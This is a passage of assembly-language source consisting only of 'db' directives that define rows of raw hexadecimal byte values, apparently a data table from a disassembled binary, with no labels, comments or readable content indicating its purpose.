   db 0FFh,0D6h, 60h, 39h,0FFh,	3Fh,0D0h,0E4h,0E4h, 3Fh, 50h, 93h, 12h,	  5, 81h,0DEh
   db 0DEh, 65h,0D4h, 97h, 9Eh,	82h, 22h,0AFh, 8Ah, 5Eh, 50h,0C7h, 5Eh,0DAh, 5Ah, 62h
   db  81h, 1Ch,   4,0FDh,0CDh,0E9h, 2Fh,0FEh,0BBh, 97h,0FCh,0E9h, 1Bh,	39h, 2Ch,0B2h
   db  6Ch, 79h, 17h, 53h, 3Ah,	  3, 74h,0FDh,0D1h,0CBh,0F8h, 9Bh,   7,	7Dh,   2, 8Ah
   db 0CEh,   5, 87h, 45h, 0Fh,	25h,0DAh, 3Ah,0A0h, 55h, 19h,0A3h, 61h,0FAh, 7Dh, 80h
   db  26h,0F4h, 0Fh, 4Ch,0FAh,0EFh, 51h,0B4h, 32h, 50h, 59h, 4Fh,0E7h,	9Fh,0A0h, 2Bh
   db 0FFh,0AFh,0F6h,0F2h,0FFh,0BFh,0B4h, 17h, 4Ah, 87h, 3Fh, 8Ah,0D4h,	9Fh,   2, 45h
   db	 4,0EFh, 0Ch, 90h, 8Fh,0A4h, 70h, 87h,0B4h,0CDh, 1Eh, 79h, 7Ch,0A4h,   7, 53h
   db	 8, 0Bh, 8Fh,0CDh,0D7h,	26h,   3, 9Ah, 59h, 71h, 7Ch,0D0h, 94h,	10h, 3Ah,0C4h
   db 0D6h, 82h, 65h, 8Bh, 65h,	61h,0FCh, 88h,0FEh,0B2h,   6,0CCh, 7Dh,0B6h,0ABh,0B3h
   db  44h,   7, 6Fh, 8Eh,   0,	14h, 1Bh, 88h, 25h, 9Bh, 61h, 66h,0FAh,	9Dh, 5Ah, 63h
   db  19h, 12h, 50h, 67h, 0Bh,0B7h, 49h, 9Bh,0F3h, 2Dh,0BAh,0DAh, 92h,0D8h, 67h, 82h
   db 0FAh, 4Fh, 81h,0DDh, 5Bh,	  0, 62h, 18h, 9Ch, 89h, 1Eh, 48h,0CAh,	43h,0C6h,   0
   db  93h,0E7h,0EEh,	3,0FAh,	80h, 30h, 7Bh, 50h, 5Bh,   3, 1Bh,0C2h,	25h, 44h, 66h
   db 0FAh, 35h, 9Dh, 16h, 8Fh,	68h, 68h, 6Ch,0F1h, 1Ah, 5Ah,0FCh,0FFh,0FFh,0D0h, 3Fh
   db  80h, 6Ch, 27h,0FEh,0A0h,	93h, 6Ch,   1, 40h, 33h,0F1h,0E3h, 30h,0D9h, 2Fh,0E4h
   db  55h, 79h, 14h, 53h,   4,	27h,0CBh, 8Fh, 55h,0A8h,0D4h, 6Ah,0F8h,	0Bh,   3,0D0h
   db  59h,0E3h, 9Fh,0D6h, 65h,	87h, 6Ah,0BCh,0DDh,0E0h,0EBh, 34h, 0Dh,0B4h,0DFh, 29h
   db  98h,   3,0E5h,0A2h,0BCh,0C0h,0CBh, 5Fh,0A6h,0C3h, 7Fh,0E8h,0FEh,	59h,0D4h, 6Ch
   db 0E6h, 3Eh,0EBh, 0Ah,0DEh,	32h,   7,0D4h,0ADh, 8Ah,   8, 58h, 70h,	25h, 78h, 17h
   db  8Fh, 27h,0E2h,	6,0D8h,	18h, 30h,0F4h,0B7h, 9Ch, 82h, 70h, 76h,0F4h, 9Fh,0DFh
   db 0FCh, 20h,   7,0D4h, 70h,	39h, 8Bh, 6Ch,	 2, 29h, 4Ah, 9Fh, 30h,	5Dh,0E5h, 5Fh
   db  13h, 20h, 51h, 90h, 0Bh,	  1,0EBh, 30h,0CEh,   0, 1Eh, 21h,   9,	0Eh,0BFh,0C2h
   db 0B0h, 4Eh,   1,0A8h, 1Dh,0A0h, 9Ah,0F4h, 19h,0BEh, 59h, 12h, 19h,0C0h, 4Ah,0F1h
   db  90h,   3,0C1h,0A0h,   4,	9Ch,0D0h, 3Bh,0D1h, 62h, 60h,0D0h, 69h,	58h,0C0h, 14h
   db 0DEh,0F6h,   0, 3Dh, 79h,	90h, 11h, 95h, 15h, 31h, 98h,0B3h, 82h,	51h, 47h,0C3h
   db 0B8h,   8, 95h,0A3h,0E8h,	61h, 80h,0ACh, 6Fh, 79h,0ECh,0F3h, 33h,	5Dh, 44h,0E6h
   db	 2, 9Ah,   1, 4Bh, 6Dh,	  7,0B6h, 7Bh, 32h,   9, 7Ah,	0, 71h,0C0h,0D7h,0FEh
   db  0Fh, 88h,   6, 30h,0F1h,	34h,0FAh, 12h, 60h, 96h, 10h,0A6h,0F6h,	12h,0C8h, 3Ah
   db  81h, 18h, 20h, 79h, 9Dh,	62h, 62h, 0Bh,	 8,0C5h, 87h,0B9h,0CEh,	70h, 1Dh,0EEh
   db 0A5h, 34h, 46h,0C0h,   1,0C0h, 0Ah,0F1h,	 9,0E4h, 8Ch,0D1h, 3Fh,0BAh, 4Bh, 9Bh
   db  28h,   3,0A6h,	0, 55h,	0Bh, 3Fh, 8Ah, 83h, 86h, 6Ah, 7Dh,0EBh,0C3h,0A4h, 30h
   db	 2,0D4h, 1Dh, 7Eh, 7Ch,	2Ah, 5Bh, 44h,0ACh, 96h,0EDh, 2Fh, 2Ah,	52h, 60h,0BAh
   db 0A9h, 8Ch, 61h,0D6h,0E0h,	70h, 83h,0C5h,0CFh, 1Eh, 7Ch,0C6h, 78h,	70h,   1,   4
   db 0C1h, 0Fh, 78h,0F8h,0C0h,0A4h, 11h,0FCh,0C1h,0C4h,0C6h,0C3h, 7Eh,	3Dh,0F8h,0B4h
   db  6Eh, 6Ch,0A0h,	9, 78h,0C5h,0C0h, 2Fh, 1Fh, 85h, 9Ch, 32h,0B6h,	1Eh,0B4h, 5Ch
   db 0FAh,0B7h, 71h,0BDh, 33h,	24h, 80h,   2,0DCh, 97h, 14h, 81h, 78h,0B4h, 48h, 0Bh
   db  0Dh,0A0h, 4Bh, 42h, 61h,	81h,0AEh, 46h,0DAh, 3Fh,0EBh,	6, 5Dh,	  7, 2Ah, 5Dh
   db  33h, 4Eh, 0Eh, 23h, 11h,0B5h, 78h, 31h, 86h,0A3h,0B7h, 64h, 0Eh,	  8,0C8h,   5
   db  7Fh, 58h, 1Fh,0E8h, 9Fh,	2Fh, 4Fh, 33h,0C0h,0FFh, 93h,0D2h, 89h,0C6h, 36h, 7Ah
   db  64h,0F5h,   6, 7Ah, 80h,0B0h, 35h, 10h,0AEh, 40h,0E7h, 4Ah, 0Eh,0FEh, 0Fh, 38h
   db 0C7h,0C9h,0F6h,	2,0DEh,	72h,0F8h,   0,0B1h,   4,0CCh,0AAh, 54h,	7Eh, 7Ah,   2
   db  0Dh,0BAh,0A2h, 69h, 5Fh,	60h, 1Dh,0A0h,0B0h, 7Bh, 91h,0FFh, 4Fh,0EBh, 57h, 5Eh
   db	 9, 9Dh, 23h, 75h,   5,	1Ch,0BCh, 1Ch, 9Ah, 4Eh, 4Bh, 38h, 30h,0A9h,0B8h, 13h
   db  35h,   5,0D2h, 2Ah, 88h,0A5h, 4Fh, 71h,0C3h, 0Ch,0D6h,	5,0C6h,0ABh, 26h, 3Eh
   db 0F1h,   2, 9Dh,0CEh,0F1h,	94h, 7Dh, 6Bh, 4Eh, 67h, 4Dh, 99h, 21h,	29h, 1Bh, 88h
   db  41h, 37h, 1Bh,0C8h,0EAh,	12h,0E1h, 3Eh,0DEh,0EEh, 99h, 11h,   0,	37h, 5Bh, 63h
   db  87h,0EAh, 0Dh,0BAh,0DDh,	16h, 2Ch, 82h, 18h,   8,0B4h, 76h,0EDh,0C8h, 19h, 73h
   db 0FFh,0FFh, 7Fh,	4, 6Ch,0F9h, 5Bh,0FEh,0E9h, 4Fh, 8Ah,0A6h,0A0h,0E3h,0DEh,0DAh
   db  71h,0D1h,0FCh,0C6h, 82h,	33h, 4Eh, 75h, 91h,0FEh,0ACh, 7Ah, 8Ah,	11h,0E4h, 91h
   db  1Bh, 9Eh,0E0h, 7Eh, 61h,	30h,0E7h, 5Bh, 78h,0A9h, 13h,0D0h,0EAh,	89h, 76h, 60h
   db  96h, 2Eh,0E8h,0D7h, 93h,	0Eh, 84h,0FDh, 7Eh, 18h,0F4h, 80h, 0Ah,0FDh,0FFh,0B7h
   db 0C7h,0A7h, 62h,0AFh, 0Fh,0A8h, 62h,0A3h,0FEh, 3Ah, 7Ah, 43h,0FFh,	30h, 17h,0A8h
   db  3Fh, 89h, 14h,0FFh,   6,	  2, 68h,0A3h, 8Fh,0C6h, 37h, 6Eh, 68h,	2Ah, 13h, 8Dh
   db  1Fh,0B8h, 85h, 9Dh,0AFh,0ECh, 73h, 45h, 7Fh, 4Eh,0FDh, 8Ch, 80h,0C1h,0C3h,0F8h
   db 0A1h, 75h, 84h, 0Fh, 82h,0CEh,0A6h, 75h,0B1h, 31h,0D6h, 73h,0BFh,0C2h,0A7h, 7Ah
   db  74h,   1,0F4h,0FFh, 22h,0BAh, 4Ch,0BBh, 6Dh, 11h,0BDh,0AFh,0BFh,	  1,0F4h,0D1h
   db  4Eh,0ABh, 42h,0FFh,0FCh,0FFh,0FBh,0B4h, 70h,0BBh,0D1h, 69h, 17h,	68h, 48h,0BAh
   db  69h, 27h,0FFh,0FFh, 43h,	91h, 87h, 67h,0FFh, 17h, 49h,0EFh,0BEh,	71h, 10h,0FFh
   db 0FFh,0FFh,0BFh,0B7h,0D9h,0DFh, 22h, 1Dh,0A0h,0C8h,0BCh,0C5h,0E8h,	  6, 48h,0F1h
   db  50h,0F5h,0BEh, 15h,0D0h,	66h,0EDh,0B7h, 25h, 91h, 89h, 69h, 29h,	0Ch,0F5h, 7Bh
   db  6Bh,0F1h,0FFh, 0Fh,   2,	  2,   0, 0Ch, 81h,   1,0A5h,	1,0EAh,0A6h,0E8h, 40h
   db  40h,0BFh,0F3h,	1,0FBh,0E9h,0C0h, 8Eh,0C6h, 5Dh, 27h,0C1h,0C3h,	12h, 8Fh, 83h
   db  7Eh,0DAh, 22h, 29h,0E3h,	3Bh, 15h,0BFh,	 8,0D0h,0D1h,0B6h, 7Ah,0DDh, 62h,0FEh
   db  81h, 19h,0ADh, 16h, 0Eh,0D9h,0ABh,0FAh,0FBh, 33h, 98h, 13h,0A6h,0CCh, 3Eh, 31h
   db	 3,0E7h,   6, 55h,0E7h,0EFh, 10h,0E1h,0C1h,0FFh, 7Dh, 43h, 66h,0FCh, 94h, 68h
   db	 1,0D8h,0A0h, 8Ah, 40h,	20h,0DFh, 7Ah,	 2,0CDh,   6, 55h,0F1h,	4Dh,0F8h,0DFh
   db 0FFh, 97h, 13h,0FEh,0C2h,	3Fh,0BAh,   9, 94h,   9, 9Fh, 6Eh, 8Fh,	68h, 14h,0BEh
   db 0ABh, 5Ah,   7,	0,   1,	1Dh,0D1h, 28h,0C5h,0D2h,0DCh, 18h, 50h,0E2h,0BFh,   4
   db  72h, 4Bh, 47h, 6Eh, 74h,0C4h, 3Bh, 3Ah, 87h,0FCh,0B5h, 38h, 80h,	87h, 17h,0F1h
   db  5Eh, 71h, 0Dh,0BFh, 1Ah,0FDh, 6Bh,0E9h, 47h, 26h, 64h,	0,0D0h,	10h,0ACh,0E1h
   db 0D5h, 81h,0B0h, 6Fh, 4Fh,	59h,0F8h,0DDh, 0Dh, 9Fh,0D2h, 8Fh, 69h,	9Ah,0E5h,0D8h
   db  9Fh, 6Eh,0C3h, 37h, 64h,0FDh, 3Bh, 4Ch, 40h,0E8h,   3,0B4h, 85h,0FBh,   8, 73h
   db	 9, 88h,0C5h, 80h, 13h,0B3h,0E7h,0D0h, 29h, 0Ch, 6Dh, 93h, 6Ah,0AAh, 1Fh,   6
   db	 1,0B3h,0FEh, 12h, 92h,0F5h, 13h,0CCh, 6Eh,0DDh, 3Dh,0ECh,0F1h,	82h,0B0h, 5Ch
   db  58h,   0, 6Ah, 11h, 3Ch,0AAh,0BEh,   0,0DAh, 98h, 49h,0C0h,0FAh,	48h, 17h,0CAh
   db  89h, 11h, 3Ch,0C3h, 0Eh,0D6h, 13h, 21h,0D7h, 89h,0C3h,0F2h, 6Fh,0E1h,0E7h,   2
   db	 9,0FCh,0A0h, 0Ah,0C3h,	3Fh, 2Ch,0F6h,	 4, 0Ah,0B7h,0CEh,0D1h,	  1, 5Bh, 7Ch
   db  74h,0B4h,0EAh, 80h,0E8h,0FFh,0BFh, 0Eh, 85h,0B5h, 78h,0EEh,0DBh,	70h, 3Fh,0CFh
   db 0A0h, 9Bh, 68h, 8Fh, 5Dh,0ADh, 33h,0D3h,	 2,0EAh,0DAh,0FFh, 5Dh,0A1h,0AEh, 7Dh
   db 0CFh, 45h, 8Dh, 82h,0BBh,0BEh,0AAh,0ADh, 65h, 42h, 0Eh, 38h, 9Ah,0E7h,0C4h, 0Bh
   db  51h,   2,0BCh, 84h, 3Ch,	62h,0C1h,0E9h, 2Fh,0B3h, 68h, 31h,0FCh,	79h,0D1h,0FFh
   db 0FFh, 7Bh, 74h,0E0h, 9Ch,0D7h, 53h,0F8h,0F6h, 5Fh, 80h,0DFh, 1Ch,	2Dh,0E1h, 6Fh
   db 0BBh, 80h, 0Eh, 82h,0D0h,0B8h,0A0h,0E0h, 43h, 1Bh, 38h, 64h, 18h,	96h,   1, 3Ah
   db  8Eh, 11h, 7Eh, 6Ch,0AFh,	19h,0E8h,0F5h,0F4h,0ECh,0CFh,0E2h, 68h,0E2h,0E9h, 53h
   db 0D3h, 7Bh,   2, 39h,0BDh,	9Bh,0D0h,0CCh,0FFh, 5Bh, 5Eh, 3Fh, 83h,	34h, 17h, 6Fh
   db 0B8h,0E2h,   3, 71h,0F4h,	4Ch,0B8h,   8,0D7h,0F6h,0C2h, 46h, 85h,	87h, 8Dh,0FEh
   db 0B3h,0DFh, 36h, 90h, 75h,0DCh,   1, 5Ch,0EBh,0A0h, 8Bh, 44h,   3,	27h,0FEh, 19h
   db 0C1h,0E8h,0EEh,0D5h, 6Fh,	1Eh, 21h, 98h,0AFh, 40h,0A7h,0C4h,0E0h,	0Eh, 82h,0F5h
   db  1Eh, 40h, 21h,0CCh,   8,	4Eh, 69h,0BEh, 76h, 5Fh, 17h,0D3h, 45h,	9Bh,0A1h, 6Ch
   db  46h, 27h,0D4h, 22h,0F0h,	27h,0F0h, 82h, 53h,0DEh, 15h, 18h, 65h,0D4h,   4,   6
   db  8Dh, 0Dh,0EBh,0A6h, 70h,	30h,0D7h, 7Dh, 37h,   3, 8Ch, 19h, 71h,	47h, 8Ah, 6Fh
   db  12h, 66h, 2Eh, 95h, 2Ah,	87h,0FDh, 91h, 6Fh, 5Fh, 44h,	8, 0Dh,	60h,0D0h, 1Fh
   db 0D2h, 39h, 1Dh, 7Eh, 7Eh,	13h, 82h,0B8h,0C0h,0F8h, 93h, 8Bh, 9Fh,0A2h,   2, 72h
   db 0F8h,0C0h, 39h, 53h, 0Eh,	5Ah, 85h,0D5h, 6Fh, 5Dh, 0Eh,0EAh, 66h,0B4h,   4,0AAh
   db 0B4h,0FEh,0B4h, 92h, 13h,0BAh,0E8h, 97h,0F5h, 4Fh, 17h, 3Dh,0DAh,0BEh,0C4h,0A7h
   db  55h,0AFh, 57h, 78h, 46h,0A5h, 87h, 10h,0C0h,0D9h,0B9h,0D2h, 3Fh,	38h,0E8h, 0Ch
   db  79h,0FAh, 51h, 7Ah,0CFh,	8Ch,0EEh,0AAh, 48h,0E9h, 5Eh, 27h,0DAh,0BEh,0ABh,0F7h
   db 0DAh,0FAh, 75h, 48h, 66h,	4Ch, 8Bh,0FBh,0A8h, 2Ch,0C4h,0DAh, 3Eh,	6Fh,   9, 3Ah
   db  8Dh,0FEh, 48h,0C2h,0CEh,	76h,0E0h, 6Fh,0D9h,   6,0D4h, 30h, 8Fh,0A2h, 58h,0D4h
   db  12h,0C0h,0D7h, 91h,0FAh,	71h,0A2h,0CFh,0AAh, 91h, 5Bh, 15h,   7,	9Dh, 55h, 0Fh
   db	 0,0FDh, 43h, 5Bh,0ADh,	0Fh,0CBh, 13h,	 1, 3Ah,0A5h, 8Eh,0B0h,	34h,0F5h, 34h
   db  43h,0D5h, 35h, 75h, 9Bh,	  6, 98h,0D4h, 1Dh, 2Ch, 6Ah,0E0h, 60h,	0Ch,0FEh,0A6h
   db  2Ch, 16h, 83h, 17h, 8Ch,	66h,0CEh,0C1h, 39h, 56h, 22h, 0Dh,0F7h,	70h, 59h,0A3h
   db  22h,0C9h, 60h, 1Ch, 38h,	12h, 44h, 0Ch, 60h, 41h,0E1h,0E0h, 58h,	78h,0B9h,0EBh
   db  19h, 87h, 33h, 24h, 79h,0A4h, 32h, 70h, 4Dh,   3, 77h,0B4h,0E0h,	65h,0E4h, 62h
   db 0F4h,0A8h,0CFh,0C0h,0D0h,	1Ah,   4, 4Ch,	 7, 70h,0B0h, 78h, 30h,	8Ah, 18h,0B8h
   db 0D8h,0A8h, 63h, 1Ch, 6Bh,	  1,0EFh, 1Ah,0D6h, 83h, 7Ch,0E8h, 0Fh,	2Ah, 22h,0EDh
   db 0AEh, 40h,0CEh, 59h, 41h,0D0h,0B4h,0D6h, 71h,0A4h, 13h,0E0h, 0Ah,0CFh, 76h, 79h
   db 0E8h, 9Bh, 50h,0DEh, 60h,	60h,0D1h,0C6h, 18h, 36h,   8, 99h,0E9h,	3Fh,   2, 11h
   db  95h, 15h,0D2h,0AEh,0FFh,0DDh, 9Ch,0ECh,0D2h, 52h, 2Fh,0B3h, 3Fh,0D8h, 58h,0A2h
   db 0EBh,0C4h,0E9h,0E3h, 13h,	2Ch,0ECh, 99h,0FDh, 67h,0E7h,0F8h,0CDh,	4Bh,   7,0ECh
   db  5Bh,   0, 93h,0FDh, 53h,0DDh,0BAh, 6Bh, 18h,0DEh, 80h,	0,0C3h,	45h, 75h,0C3h
   db  1Fh, 20h, 53h, 59h, 66h,	93h, 53h, 45h, 55h, 19h, 76h, 65h, 67h,	65h, 4Ah, 33h
   db 0C6h,0B1h, 75h, 24h, 4Dh,	  1,0B5h,0F1h, 89h,0F2h, 47h, 58h, 98h,0C2h, 17h,0E1h
   db 0A2h, 12h,0CDh, 84h, 46h,	52h,   2, 99h, 87h,0B4h, 4Ah, 8Eh,0ADh,0E8h, 3Bh,0E9h
   db  35h, 48h, 5Bh,0A3h, 10h,0D4h,   5, 1Bh, 6Eh, 90h,0BEh, 45h, 56h,	88h,0F4h, 70h
   db  21h, 33h,0AFh, 2Dh,   1,0C0h, 83h, 98h, 28h, 18h, 27h,0D1h,   7,0D0h, 63h,0EBh
   db  0Fh, 90h, 30h, 45h,0EBh,	28h,0A5h,0C6h, 74h, 5Ch, 0Ah, 50h,0B8h,	68h, 6Ch, 9Eh
   db 0CEh,0D4h,0E6h, 0Bh, 5Dh,	0Eh, 30h,0A3h, 44h, 9Ah,0D8h, 1Ch, 30h,	7Ah, 74h,0EBh
   db  46h,0FBh,0AFh,0BDh,0DAh,	77h,0C7h,0F1h, 0Eh, 18h,0CFh, 39h,0B1h,	42h, 67h, 60h
   db  59h, 27h,0E9h,0E6h,0DDh,	28h, 3Ch,0E5h,0A7h,0F0h, 21h, 8Ah,0BDh,	  8, 0Ah,   7
   db  29h,0CAh, 64h, 3Ah,0DEh,	1Fh, 8Ah,0C2h, 0Fh,0C6h, 87h,0B1h, 3Dh,0A3h, 45h, 5Fh
   db  5Eh,0EEh,0CFh,	9, 45h,0FEh,0FDh,0D8h,0A0h, 14h, 67h,0E5h,0EDh,0AFh,0B9h, 2Fh
   db 0D0h, 64h, 3Ah, 15h,0DFh,0A1h, 11h,0EEh,0C9h, 19h, 12h, 87h, 98h,	22h, 0Eh, 3Fh
   db  26h, 1Dh,0C9h,0A0h,0FAh,	92h, 3Fh, 2Ah, 4Bh, 97h, 78h,	5, 75h,	60h,0BCh, 3Fh
   db 0FAh, 5Fh, 53h,0FAh, 93h,0D2h, 3Fh, 56h, 6Ah, 5Dh, 23h, 58h,0F8h,	2Dh,0D0h, 7Fh
   db 0E7h, 46h, 56h,0C3h, 66h,	88h,0B9h, 2Fh,0B8h,0A9h, 32h, 45h, 41h,	75h, 7Fh, 65h
   db 0EBh,0CCh, 1Fh,0D2h, 6Bh,	6Fh,0EEh, 6Ah, 5Ch,0EDh, 7Dh, 85h, 83h,	5Eh,0D9h, 3Ah
   db  7Dh,0A5h,0DCh, 57h, 1Fh,	61h, 4Eh, 15h, 48h,0DEh, 22h, 12h, 68h,	7Bh,0A0h, 3Ah
   db  9Dh, 55h, 87h, 4Fh, 7Ch,	89h,0EEh, 4Eh, 7Fh, 7Bh, 33h, 2Ah,   7,0FAh, 16h,0EEh
   db 0A1h, 67h, 91h, 7Eh, 16h,0F7h,0E0h, 95h,0CBh, 5Fh, 0Dh,0ECh,0E7h,0FDh, 47h,   5
   db 0EAh,0E1h, 1Bh, 17h,0D3h,	26h, 48h,0F9h,0DFh, 80h, 52h,0DDh, 8Ah,0B4h, 29h, 44h
   db  3Ah, 0Ch,0D2h, 43h,0EBh,	  4,0DAh, 41h,0DAh,0C3h,0ABh,0F4h,   0,	67h,0ACh,0BDh
   db  40h, 16h, 1Bh, 13h, 38h,0A8h, 84h, 3Bh, 58h, 3Ch,0A0h, 31h,   3,	74h,0C6h,0F1h
   db 0DFh, 6Ah, 7Dh,0AEh,0A8h,0BFh, 65h,0F4h, 17h, 1Fh, 8Bh,0CCh, 0Dh,	7Ah, 49h,0BAh
   db  1Ah, 5Dh, 3Ah,0A0h, 81h,	82h,   8, 7Eh, 50h, 2Ah,0D4h,	7, 71h,	6Ch, 45h,0E6h
   db  77h,   0,0FCh,0E9h,   4,	91h,   9,   3, 8Eh, 9Dh, 17h, 5Bh,0D2h,0EDh, 93h, 87h
   db  82h, 7Eh, 7Fh, 7Eh,0FDh,	98h,0E8h, 6Fh, 79h,0D7h, 66h, 9Bh,0AAh,	0Bh,0B3h, 37h
   db 0F3h, 3Ch,0A1h, 2Bh, 64h,0A4h,0B7h, 75h,0D4h, 3Fh, 1Bh,0E1h, 68h,0D4h, 68h,0E9h
   db 0FFh,0FFh,0BFh, 3Eh, 9Dh,	3Eh,0E8h, 96h, 6Bh, 9Dh,   8, 0Eh,0CEh,	17h,0FDh, 0Fh
   db 0B2h,0EDh,0BBh,0A5h, 27h,	72h, 6Fh,   0, 41h, 57h, 8Dh,0F1h, 38h,	5Ah, 27h,0C6h
   db  60h, 55h,   8,0D1h,0FFh,	8Ah,0FEh,0E9h,0FEh,0FFh, 6Dh,0A0h,0EAh,	1Fh,0DAh,   3
   db  6Fh, 91h, 24h, 87h,0A3h,0DBh, 38h,   4, 98h,0CCh, 18h, 8Bh, 22h,	89h, 4Ch, 84h
   db	 7, 6Bh, 18h, 3Fh,0D0h,0FAh, 14h, 44h,0EBh,0F2h, 75h, 49h, 21h,	97h, 7Ah, 5Ch
   db 0D4h, 98h, 9Ch,	3, 1Bh,	64h,0C6h, 5Ch,0FDh, 51h,   7, 9Ch,0B2h,	72h,0EBh, 8Ch
   db 0C0h, 98h,0BDh,	0,0EAh,	3Fh,0ACh,0F3h, 9Ah, 3Ch,0A7h,0D9h, 13h,0BAh, 67h,0EBh
   db  5Fh, 19h,   9,0AFh, 44h,0FAh, 6Bh,0D2h, 80h, 8Eh, 98h,0AFh, 42h,0D2h,0AFh, 65h
   db  5Fh,0F3h, 44h,0FFh,0FDh,0FBh,0DCh,0D9h, 41h, 4Ah,0E7h,0DDh,0B5h,0A9h,0CBh,0FBh
   db  27h, 3Fh, 45h,0A7h, 4Fh,0FCh, 0Dh,0F6h, 68h,0A7h, 80h,0B6h,0B1h,	2Bh,   8, 3Dh
   db  48h,   4, 8Ah, 69h,0B0h,	4Ch, 3Bh, 5Fh, 31h,0DFh, 3Ah, 66h,0E3h,0ECh, 63h,0BCh
   db 0BFh, 8Ah,0FEh,0A5h,0FAh,	27h,0D7h, 6Ch, 15h,0A6h, 88h, 29h,0FAh,0FFh,0EFh,0F6h
   db  5Ch, 92h,0EEh,0C1h,0E8h,0B4h, 3Fh,0A5h,0D1h, 48h,0FDh, 57h, 84h,	43h,0C8h,   1
   db 0D2h,0C1h, 1Ch, 20h, 83h,0BAh, 8Eh, 0Fh, 46h,0C6h, 77h, 17h, 6Dh,0A8h, 23h, 81h
   db 0C8h, 41h,0B0h, 55h,0ACh,	7Bh,0EFh,0D3h,0A0h,   7,0CFh,0EEh,0E8h,0F5h, 0Eh, 4Eh
   db  51h,0F9h,0AEh, 9Bh,0D2h,	2Eh, 50h, 78h, 81h, 2Bh, 64h, 9Bh, 42h,0A8h,0F8h,0FEh
   db 0D5h, 64h, 5Ch,0BBh, 78h,	80h, 38h, 40h, 5Dh, 27h,0D4h, 41h, 4Ah,0E5h, 7Ah,0DDh
   db  7Ah,0CFh, 43h,0FFh,0AEh,0D0h,0E1h, 77h, 9Dh,0A5h, 77h,0F1h, 15h,0FBh,   3, 4Ch
   db 0B3h, 3Fh,0C9h, 9Eh,0E2h,0FFh,0C1h, 6Bh, 58h,0F7h,0EEh, 4Bh, 67h,0F2h, 27h, 7Fh
   db  37h, 45h, 20h,0D1h,0B1h,	3Bh, 0Eh, 90h,0DEh,0D2h,0E2h, 3Eh, 48h,0E3h, 3Fh, 86h
   db 0C9h,0A2h,0C5h, 4Bh,0B7h,	9Fh,0F7h, 6Fh,0CFh,0ECh,0E8h, 6Dh, 3Bh,	41h, 26h,   1
   db  25h,0C8h,0FAh, 66h, 1Eh,	97h, 28h,0AAh,0E8h, 1Ch, 88h, 42h,0F5h,0B3h,0FAh, 45h
   db 0C2h, 5Fh,0ADh, 50h,0CDh,	60h, 6Ah,0FBh,0EAh,0B1h,0A7h, 20h, 80h,	70h, 96h,0B5h
   db  38h,0E1h, 2Dh, 59h, 0Dh,0D9h,0DDh,0EAh,0BDh,0DDh, 33h, 23h, 9Dh,	1Ah,0B6h,0F2h
   db  9Ah,0DAh, 1Fh, 96h, 6Bh,	  1,   7,0FFh, 68h, 7Bh, 0Bh, 4Ah,0FDh,0D9h, 49h, 22h
   db  1Fh, 52h,0FCh, 32h,0ADh,0C3h,0EAh, 15h,0B4h,0D0h, 7Eh,0FFh,0CFh,0FEh,0C4h, 79h
   db  72h,0EDh,0CDh, 78h, 8Bh,	3Fh, 20h, 85h,0F4h,0AFh,0A3h, 8Eh,0CFh,	1Fh,   5,0D7h
   db 0C8h,0D1h,   2,	4, 0Dh,0D4h,0F8h, 3Bh, 7Fh, 81h, 1Ah,0FFh, 53h,	1Dh,0ADh,0F1h
   db  47h, 7Ch,0B7h,0FDh, 62h,	84h, 7Eh, 52h, 3Dh,0FBh, 73h, 3Dh,0A4h,	30h, 10h, 9Eh
   db  52h, 4Dh, 21h, 1Dh, 3Bh,	7Ah, 2Dh, 30h,0D6h, 12h, 6Ah,0ECh, 19h,0CEh,0ECh, 96h
   db  58h, 40h,0C3h,0F5h,   1,	  6, 9Fh, 67h, 1Bh, 9Ch, 9Dh,0E1h,0CEh,0BFh, 9Ah, 73h
   db  88h,0BEh,   6,0B4h, 68h,	87h, 26h,0F5h,0FCh, 3Ch, 49h,0ADh, 80h,	70h,0C0h,0B0h
   db 0A5h, 39h,0CDh,0CCh, 9Fh,	0Fh, 2Ch,0B3h, 59h,0DAh,   2,	7, 81h,	17h, 62h, 6Fh
   db 0F5h, 89h,0C7h,0E9h,0F1h,0EFh,0D6h,0A1h,	 4,   8, 3Bh,0A1h,0B1h,	83h, 1Ah, 91h
   db  44h,0EFh,0CFh, 21h, 1Eh,	6Bh, 44h, 9Eh, 6Fh,   6,0D5h,0DBh,   1,	72h, 22h,0AEh
   db  8Fh,0C0h, 58h,0B0h,0CFh,	6Ah,0F0h, 14h, 8Dh,0BEh, 82h, 7Eh,0A0h,	5Bh, 37h,0EFh
   db  43h,0EFh,0C6h,	7, 18h,0F5h,0ADh, 90h, 30h, 96h,0D0h, 3Dh,0F0h,0F2h, 16h, 41h
   db  3Bh, 4Fh,0ADh, 2Bh, 40h,0EAh, 14h, 5Dh,0ADh,0B7h, 78h, 3Dh, 3Ah,	43h,0A0h,0A1h
   db  58h,0C0h, 9Ch, 1Bh, 83h,	85h,0EBh, 49h, 71h, 11h, 7Fh, 3Fh, 30h,	17h,0CCh,0B1h
   db 0E1h, 8Dh,0E8h, 22h,0EDh,0DEh,0B8h,0F5h, 16h,   8, 4Eh, 0Ch,0DFh,	30h,0FAh,0F2h
   db 0C9h, 7Dh, 13h,0EFh, 8Fh,0D6h, 47h, 2Dh, 91h, 74h,0D9h,0DFh, 10h,0FDh, 93h,0B4h
   db 0A3h,0FBh, 1Bh, 97h, 38h,0B7h,0EEh, 76h,0B5h,0B3h, 4Ch, 37h, 18h,	95h, 40h, 9Fh
   db  80h,0D6h, 66h,0E9h, 9Dh,	  1, 5Ah, 1Ch, 89h,   2,   5,	4,0ABh,0A0h, 71h, 49h
   db  86h,0ABh, 28h, 10h,0D1h,	4Dh, 1Bh,0EEh, 53h, 68h,0E9h,0F5h,0F6h,	0Eh, 96h, 2Ch
   db  0Eh, 80h, 82h,0A9h, 9Dh,	2Fh, 72h,0BBh, 69h, 36h,0E0h, 4Fh,0A7h,	62h,0FFh, 87h
   db 0DFh,0EFh, 15h, 4Ch, 66h,	9Fh, 20h,0FBh,0C8h,0A9h,0B0h,0C7h, 30h,	6Ch,0F7h, 0Eh
   db  14h, 79h, 1Fh, 5Dh,0A0h,	  7, 5Ah,0B0h,0BFh,0DEh,0AFh,0D1h,0FFh,	6Fh, 50h,0A7h
   db  3Ah, 60h, 3Fh, 47h,0D3h,0E9h,0EAh, 9Dh,0C6h, 30h,   2, 8Ch, 2Ch,0D1h, 0Dh,0DEh
   db 0ABh,0BAh,0C1h,0CDh, 90h,0DEh,0F0h, 97h, 98h,0ABh,0B3h,0BBh, 1Fh,	3Dh, 5Ch,   3
